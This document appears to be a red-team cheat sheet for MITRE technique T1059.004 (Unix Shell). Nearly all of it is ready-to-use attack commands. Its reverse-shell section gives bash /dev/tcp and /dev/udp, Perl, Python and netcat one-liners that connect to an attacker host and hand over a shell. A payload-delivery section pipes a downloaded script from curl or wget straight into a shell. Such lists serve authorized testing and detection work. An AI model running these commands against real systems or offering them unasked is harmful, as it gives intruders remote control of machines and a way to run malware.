# T1059.004 - Unix Shell (tooling)

## Direct shell invocation

```bash
# Execute command (any shell)
sh -c "whoami"
bash -c "whoami"
zsh -c "whoami"

# Execute command and stay interactive
bash -i

# Execute via stdin redirect
bash < script.sh
```

## Reverse shells

```bash
# Bash /dev/tcp reverse shell (bash only, not sh/zsh/dash)
bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1

# Bash exec-based reverse shell (bash only)
exec 5<>/dev/tcp/<ATTACKER_IP>/<PORT>; cat <&5 | while read line; do $line 2>&5 >&5; done

# Bash UDP reverse shell (bash only)
bash -i >& /dev/udp/<ATTACKER_IP>/<PORT> 0>&1

# Python reverse shell
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<ATTACKER_IP>",<PORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Perl reverse shell
perl -e 'use Socket;$i="<ATTACKER_IP>";$p=<PORT>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i")}'

# Netcat reverse shell (openbsd variant with -e)
nc -e /bin/sh <ATTACKER_IP> <PORT>

# Netcat mkfifo reverse shell (gnu netcat, no -e)
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <ATTACKER_IP> <PORT> > /tmp/f
```

## Remote payload delivery

```bash
# Download and pipe to shell (live off the land)
curl -fsSL http://<host>/payload.sh | bash
wget -qO- http://<host>/payload.sh | sh

# Download to disk and execute
curl -fsSL http://<host>/payload -o /tmp/payload && chmod +x /tmp/payload && /tmp/payload
```
